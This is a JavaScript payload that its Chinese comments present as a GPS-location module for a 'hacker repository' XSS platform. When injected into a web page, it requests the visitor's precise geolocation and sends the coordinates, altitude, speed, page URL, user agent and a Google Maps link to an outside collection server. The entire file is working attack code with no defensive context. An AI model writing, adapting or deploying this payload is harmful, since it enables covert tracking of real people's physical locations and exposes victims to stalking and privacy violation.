// GPS地理定位Payload - 黑客仓库XSS平台
// 获取用户精确地理位置信息

(function() {
    'use strict';
    
    var config = {
        serverUrl: 'https://xss.li/api/collect.php',
        enableHighAccuracy: true,
        timeout: 10000,
        maximumAge: 0
    };
    
    console.log('📍 黑客仓库XSS - GPS定位模块启动');
    
    if (!navigator.geolocation) {
        console.error('浏览器不支持地理定位API');
        return;
    }
    
    // 获取位置信息
    navigator.geolocation.getCurrentPosition(
        async function(position) {
            const gpsData = {
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
                accuracy: position.coords.accuracy,
                altitude: position.coords.altitude,
                altitudeAccuracy: position.coords.altitudeAccuracy,
                heading: position.coords.heading,
                speed: position.coords.speed,
                timestamp: new Date(position.timestamp).toISOString()
            };
            
            console.log('📍 位置获取成功:', gpsData.latitude, gpsData.longitude);
            console.log('🎯 精度: ±' + gpsData.accuracy + '米');
            
            // 发送到服务器
            try {
                const response = await fetch(config.serverUrl, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        type: 'gps_location',
                        gps: gpsData,
                        url: window.location.href,
                        userAgent: navigator.userAgent,
                        googleMapsUrl: `https://www.google.com/maps?q=${gpsData.latitude},${gpsData.longitude}`
                    })
                });
                
                if (response.ok) {
                    console.log('✅ GPS数据上传成功');
                } else {
                    console.log('❌ GPS数据上传失败');
                }
            } catch (error) {
                console.error('发送GPS数据失败:', error);
            }
        },
        function(error) {
            let errorMsg = '';
            switch(error.code) {
                case error.PERMISSION_DENIED:
                    errorMsg = '用户拒绝了地理位置权限请求';
                    break;
                case error.POSITION_UNAVAILABLE:
                    errorMsg = '位置信息不可用';
                    break;
                case error.TIMEOUT:
                    errorMsg = '获取位置超时';
                    break;
                default:
                    errorMsg = '未知错误';
            }
            console.error('GPS定位失败:', errorMsg);
        },
        {
            enableHighAccuracy: config.enableHighAccuracy,
            timeout: config.timeout,
            maximumAge: config.maximumAge
        }
    );
    
})();
